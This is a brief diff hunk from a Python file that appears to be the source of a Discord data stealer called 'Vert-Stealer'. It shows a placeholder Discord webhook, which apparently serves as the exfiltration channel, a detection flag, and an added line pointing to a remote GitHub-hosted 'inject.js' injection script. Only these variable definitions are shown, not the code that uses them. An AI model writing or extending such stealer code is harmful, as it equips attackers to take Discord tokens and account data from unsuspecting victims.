@@ -16,6 +16,7 @@ import re
 import subprocess
 
 hook = "Your Disord Webhook"
+injecturl = "https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js"
 
 DETECTED = False
 
